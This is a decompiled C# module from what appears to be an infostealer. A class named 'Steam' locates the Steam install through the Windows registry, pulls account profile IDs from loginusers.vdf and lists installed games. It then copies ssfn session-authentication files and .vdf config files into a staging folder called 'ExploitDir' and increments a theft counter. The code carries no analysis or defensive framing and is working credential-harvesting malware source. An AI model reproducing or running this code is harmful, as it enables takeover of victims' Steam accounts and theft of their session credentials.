﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x02000064 RID: 100
	internal class Steam
	{
		// Token: 0x06000228 RID: 552 RVA: 0x0000D868 File Offset: 0x0000BA68
		public static void SteamGet()
		{
			try
			{
				string text = Help.ExploitDir + "\\Steam";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Steam.SteamPath_x32);
				string text2 = registryKey.GetValue("SteamPath").ToString();
				if (Directory.Exists(text2))
				{
					if (Steam.GetLocationSteam("InstallPath", "SourceModInstallPath") != null)
					{
						if (Steam.GetAllProfiles() != null)
						{
							Directory.CreateDirectory(text);
							foreach (string contents in Steam.GetAllProfiles())
							{
								File.AppendAllText(text + "\\AccountsList.txt", contents);
							}
							foreach (string str in registryKey.OpenSubKey("Apps").GetSubKeyNames())
							{
								using (RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + str))
								{
									string text3 = (string)registryKey2.GetValue("Name");
									text3 = (string.IsNullOrEmpty(text3) ? "Unknown" : text3);
									File.AppendAllText(text + "\\Games.txt", text3 + "\n");
								}
							}
							if (Directory.Exists(text2))
							{
								Directory.CreateDirectory(text + "\\ssnf");
								foreach (string text4 in Directory.GetFiles(text2))
								{
									if (text4.Contains("ssfn"))
									{
										File.Copy(text4, text + "\\ssnf\\" + Path.GetFileName(text4));
									}
								}
							}
							string path = Path.Combine(text2, "config");
							if (Directory.Exists(path))
							{
								Directory.CreateDirectory(text + "\\configs");
								foreach (string text5 in Directory.GetFiles(path))
								{
									if (text5.EndsWith("vdf"))
									{
										File.Copy(text5, text + "\\configs\\" + Path.GetFileName(text5));
									}
								}
							}
							Counting.Steam++;
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x06000229 RID: 553 RVA: 0x0000DAE0 File Offset: 0x0000BCE0
		public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
		{
			string result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(Steam.SteamPath_x64, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
					{
						using (RegistryKey registryKey3 = registryKey.OpenSubKey(Steam.SteamPath_x32, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
						{
							object obj;
							if (registryKey2 == null)
							{
								obj = null;
							}
							else
							{
								object value = registryKey2.GetValue(Inst);
								obj = ((value != null) ? value.ToString() : null);
							}
							object obj2;
							if ((obj2 = obj) == null)
							{
								if (registryKey3 == null)
								{
									obj2 = null;
								}
								else
								{
									object value2 = registryKey3.GetValue(Source);
									obj2 = ((value2 != null) ? value2.ToString() : null);
								}
							}
							result = obj2;
						}
					}
				}
			}
			catch (Exception value3)
			{
				Console.WriteLine(value3);
				result = null;
			}
			return result;
		}

		// Token: 0x0600022A RID: 554 RVA: 0x0000DBE0 File Offset: 0x0000BDE0
		public static List<string> GetAllProfiles()
		{
			List<string> result;
			try
			{
				if (!File.Exists(Steam.LoginFile))
				{
					result = null;
				}
				else
				{
					List<string> list = (from Match x in Regex.Matches(File.ReadAllText(Steam.LoginFile), "\\\"76(.*?)\\\"")
					select "76" + x.Groups[1].Value).ToList<string>();
					List<string> list2 = new List<string>();
					for (int i = 0; i < list.Count<string>(); i++)
					{
						list2.Add("https://steamcommunity.com/profiles/" + list[i] + "\n");
					}
					result = list2;
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x04000131 RID: 305
		private static readonly string SteamPath_x64 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";

		// Token: 0x04000132 RID: 306
		public static readonly string SteamPath_x32 = "Software\\Valve\\Steam";

		// Token: 0x04000133 RID: 307
		private static readonly bool True = true;

		// Token: 0x04000134 RID: 308
		private static readonly bool False = false;

		// Token: 0x04000135 RID: 309
		private static readonly string LoginFile = Path.Combine(Steam.GetLocationSteam("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");
	}
}
